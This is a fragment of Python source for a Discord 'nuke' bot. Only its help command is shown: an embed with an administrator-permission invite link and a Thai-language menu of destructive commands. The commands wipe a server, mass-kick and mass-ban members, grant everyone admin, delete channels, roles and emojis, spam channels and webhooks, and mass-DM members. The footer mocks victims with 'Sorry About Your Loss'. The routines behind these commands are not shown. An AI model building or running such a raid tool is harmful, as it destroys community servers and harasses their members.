...
prefix = input("\033[95m คำนำหน้า : \033[0m")
...
async def help(ctx):
    ...
    embed = discord.Embed(title="Bot op", url="https://discord.com/api/oauth2/authorize?client_id=904787235281448961&permissions=8&scope=bot", description="help - คำสั่ง\nnukll - เริ่มทั้งหมด (พังเซิฟเล็ก)\nnukell - เริ่มทั้งหมด (พังเซิฟใหญ่)\nkall - เตะสมาชิก\nball - แบนสมาชิก\nadmll - ยศแอดมินทุกคน\nroll - ลบบทบาท\nroell - สแปมบทบาท\nchdll - ลบช่อง\nemoll - ลบอิโมจิ\nwebll - สแปมเว็บฮุก\nspall - สแปมช่อง\npinll - แท็กทุกคน\nunbll - ปลดแบน\nspam - สแปมข้อความ (spam จำนวน ข้อความ)\nnach - เปลี่ยนชื่อช่อง (nach ชื่อ)\nnase - เปลี่ยนชื่อเซิฟ (nase ชื่อ)\nname - เปลี่ยนชื่อสมาชิก (name ชื่อ)\ndmll - ส่งข้อความทุกคนในเซิฟ (dmll ข้อความ)" , color=discord.Colour.purple())
    #embed.add_field(name="Discord Server",value="[ [ Click here ] ](https://discord.gg/86rdz8Bn)",inline=False)
    #embed.add_field(name="Youtube Channel",value="[ [ Click here ] ](https://www.youtube.com/channel/UCUuji8mlYoiKyFP58ROchVsA)",inline=False)
   # embed.add_field(name="invite bot",value="[ [ Click here ] ](https://discord.com/api/oauth2/authorize?client_id=9047872375281448961&permissions=8&scope=bot)",inline=False)
    embed.set_thumbnail(url="https://media.discordapp.net/attachments/910990804917579829/911002851843670086/21482846_te5zP_2.jpeg?width=601&height=480")
    embed.set_footer(text="commard By op Bot! Sorry About Your Loss")
